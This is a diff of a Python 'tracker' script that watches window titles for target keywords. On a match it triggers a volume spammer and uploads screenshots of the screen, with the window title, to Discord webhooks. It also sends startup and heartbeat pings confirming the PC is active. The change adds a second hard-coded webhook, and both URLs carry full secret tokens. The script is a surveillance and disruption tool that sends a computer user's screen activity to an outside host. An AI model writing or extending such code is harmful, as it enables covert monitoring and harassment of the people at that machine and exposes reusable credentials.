@@ -104,8 +104,11 @@ STABILITY_TIME = 0.3    # seconds the target must stay active to trigger spammer
 PASSWORD = "stop123"    # Password to toggle tracking
 TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking
 
-# Discord Webhook Configuration
-DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"  # Replace with your webhook URL
+# Discord Webhook Configuration (BOTH WEBHOOKS)
+DISCORD_WEBHOOKS = [
+    "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0",
+    "https://discord.com/api/webhooks/1462746145708179523/Xp6Wo6UponaBzCmfU59nZLBcojNrGOVBHZqBbsucyWwxyp2PamjCgLtOgo5TE8WAZzoC"
+]
 SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
 SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
 HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
@@ -142,77 +145,110 @@ def take_screenshot():
         print(f"[SCREENSHOT ERROR] {e}")
         return None
 
-def send_discord_alert(title, keyword, screenshot=None):
-    """Send alert to Discord webhook with optional screenshot"""
-    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
-        print("[DISCORD] No webhook URL configured")
-        return False
-    
+def send_to_webhook(webhook_url, payload, files=None):
+    """Send data to a specific webhook URL"""
     try:
-        # Prepare the message
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        embed = {
-            "title": "⚠️ Target Application Detected",
-            "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`\n**Status:** {'SPAMMING VOLUME' if spamming else 'DETECTED'}",
-            "color": 16711680,  # Red color
-            "footer": {
-                "text": "Tracker System"
-            }
-        }
-        
-        if screenshot and SEND_SCREENSHOTS:
-            # Convert screenshot to bytes
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            img_byte_arr.seek(0)
-            
-            # Prepare files for multipart upload
-            files = {
-                'file': ('screenshot.png', img_byte_arr, 'image/png')
-            }
-            
-            # Prepare JSON payload for embed
-            payload = {
-                "embeds": [embed],
-                "content": "📸 **Screenshot captured below:**"
-            }
-            
-            # Send as multipart/form-data
+        if files:
             response = requests.post(
-                DISCORD_WEBHOOK_URL,
+                webhook_url,
                 files=files,
                 data={'payload_json': json.dumps(payload)}
             )
         else:
-            # Send without screenshot
-            payload = {
-                "embeds": [embed],
-                "content": f"🚨 **Target detected:** {title}"
-            }
-            
             headers = {'Content-Type': 'application/json'}
             response = requests.post(
-                DISCORD_WEBHOOK_URL,
+                webhook_url,
                 json=payload,
                 headers=headers
             )
         
         if response.status_code in [200, 204]:
-            print(f"[DISCORD] Alert sent for: {title}")
             return True
         else:
-            print(f"[DISCORD ERROR] Failed to send alert: {response.status_code} - {response.text}")
+            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:50]}...: {response.status_code}")
             return False
             
     except Exception as e:
-        print(f"[DISCORD ERROR] {e}")
+        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:50]}...")
         return False
+
+def send_to_all_webhooks(payload, screenshot=None):
+    """Send message to all configured webhooks"""
+    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
+        print("[DISCORD] No webhooks configured")
+        return False
+    
+    success_count = 0
+    threads = []
+    
+    if screenshot and SEND_SCREENSHOTS:
+        # Convert screenshot to bytes once
+        img_byte_arr = io.BytesIO()
+        screenshot.save(img_byte_arr, format='PNG')
+        img_byte_arr.seek(0)
+        
+        # Prepare files for multipart upload
+        files = {
+            'file': ('screenshot.png', img_byte_arr, 'image/png')
+        }
+        
+        # Add screenshot info to payload
+        if 'content' in payload:
+            payload['content'] = "📸 **Screenshot captured below:**"
+    
+    for webhook_url in DISCORD_WEBHOOKS:
+        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+            continue
+            
+        # Create thread for each webhook
+        if screenshot and SEND_SCREENSHOTS:
+            thread = threading.Thread(
+                target=send_to_webhook,
+                args=(webhook_url, payload),
+                kwargs={'files': files}
+            )
+        else:
+            thread = threading.Thread(
+                target=send_to_webhook,
+                args=(webhook_url, payload)
+            )
+        
+        thread.start()
+        threads.append(thread)
+    
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join(timeout=10)  # 10 second timeout per webhook
+        
+        # Check if thread completed successfully
+        if not thread.is_alive():
+            success_count += 1
+    
+    print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
+    return success_count > 0
+
+def send_discord_alert(title, keyword, screenshot=None):
+    """Send alert to Discord webhooks with optional screenshot"""
+    # Prepare the message
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    embed = {
+        "title": "⚠️ Target Application Detected",
+        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`\n**Status:** {'SPAMMING VOLUME' if spamming else 'DETECTED'}",
+        "color": 16711680,  # Red color
+        "footer": {
+            "text": "Tracker System"
+        }
+    }
+    
+    payload = {
+        "embeds": [embed],
+        "content": f"🚨 **Target detected:** {title}"
+    }
+    
+    return send_to_all_webhooks(payload, screenshot)
 
 def send_discord_status(status):
     """Send tracking status to Discord"""
-    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
-        return False
-    
     try:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
@@ -231,12 +267,7 @@ def send_discord_status(status):
             "content": f"📊 **Tracker Status Changed**"
         }
         
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
-        
-        if response.status_code not in [200, 204]:
-            print(f"[DISCORD STATUS ERROR] {response.status_code} - {response.text}")
-        return True
+        return send_to_all_webhooks(payload)
         
     except Exception as e:
         print(f"[DISCORD STATUS ERROR] {e}")
@@ -244,9 +275,6 @@ def send_discord_status(status):
 
 def send_heartbeat():
     """Send heartbeat webhook to confirm PC is active"""
-    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
-        return False
-    
     try:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         uptime_seconds = int(time.time() - program_start_time)
@@ -269,15 +297,10 @@ def send_heartbeat():
             "embeds": [embed]
         }
         
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
-        
-        if response.status_code in [200, 204]:
-            print(f"[HEARTBEAT] Sent at {current_time}")
-            return True
-        else:
-            print(f"[HEARTBEAT ERROR] Failed: {response.status_code}")
-            return False
+        success = send_to_all_webhooks(payload)
+        if success:
+            print(f"[HEARTBEAT] Sent to all webhooks at {current_time}")
+        return success
             
     except Exception as e:
         print(f"[HEARTBEAT ERROR] {e}")
@@ -285,9 +308,6 @@ def send_heartbeat():
 
 def send_startup_message():
     """Send webhook when the program starts"""
-    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
-        return False
-    
     try:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
@@ -305,15 +325,10 @@ def send_startup_message():
             "content": "📱 **System Online** - Tracker is now active"
         }
         
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
-        
-        if response.status_code in [200, 204]:
-            print(f"[STARTUP] Message sent at {current_time}")
-            return True
-        else:
-            print(f"[STARTUP ERROR] Failed: {response.status_code}")
-            return False
+        success = send_to_all_webhooks(payload)
+        if success:
+            print(f"[STARTUP] Message sent to all webhooks at {current_time}")
+        return success
             
     except Exception as e:
         print(f"[STARTUP ERROR] {e}")
@@ -437,8 +452,8 @@ print("[SYSTEM] Tracking is ENABLED by default")
 program_start_time = time.time()
 
 # Send startup webhook immediately
-if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
-    print("[STARTUP] Sending startup webhook...")
+if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
+    print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
     send_startup_message()
     
     # Start heartbeat monitor in a separate thread
@@ -446,22 +461,29 @@ if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE
     heartbeat_thread.start()
     print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
 else:
-    print("[DISCORD] No webhook configured - skipping startup and heartbeat messages")
+    print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")
 
-# Test Discord connection
-if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
-    print(f"[DISCORD] Webhook configured - Screenshots: {SEND_SCREENSHOTS}")
-    # Test webhook
-    try:
-        response = requests.get(DISCORD_WEBHOOK_URL)
-        if response.status_code == 200:
-            print("[DISCORD] Webhook URL is valid")
-        else:
-            print(f"[DISCORD WARNING] Webhook returned status: {response.status_code}")
-    except:
-        print("[DISCORD] Could not test webhook (might still work for posting)")
+# Test Discord connections
+valid_webhooks = []
+for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
+    if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
+        print(f"[DISCORD] Webhook {i} configured")
+        try:
+            response = requests.get(webhook_url)
+            if response.status_code == 200:
+                print(f"[DISCORD] Webhook {i} URL is valid")
+                valid_webhooks.append(webhook_url)
+            else:
+                print(f"[DISCORD WARNING] Webhook {i} returned status: {response.status_code}")
+                valid_webhooks.append(webhook_url)  # Still add it, might work for posting
+        except:
+            print(f"[DISCORD] Could not test webhook {i} (might still work for posting)")
+            valid_webhooks.append(webhook_url)  # Still add it
+
+if valid_webhooks:
+    print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
 else:
-    print("[DISCORD] No webhook configured - skipping Discord alerts")
+    print("[DISCORD] No valid webhooks configured - skipping Discord alerts")
 
 # Setup keyboard listener
 kb_listener = setup_keyboard_listener()
@@ -503,8 +525,8 @@ try:
                     print(f"[ACTION] Target detected: '{title}' — starting spammer")
                     threading.Thread(target=volume_spammer, daemon=True).start()
                     
-                    # Send Discord alert with screenshot
-                    if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_URL_HERE":
+                    # Send Discord alert with screenshot to both webhooks
+                    if valid_webhooks:
                         # Use a unique identifier for this detection
                         detection_id = f"{title}_{keyword}_{int(time.time())}"
                         
@@ -517,7 +539,7 @@ try:
                             # Take screenshot in main thread to avoid threading issues
                             screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                             
-                            # Send alert in separate thread to not block
+                            # Send alert to both webhooks
                             alert_thread = threading.Thread(
                                 target=send_discord_alert,
                                 args=(title, keyword, screenshot),
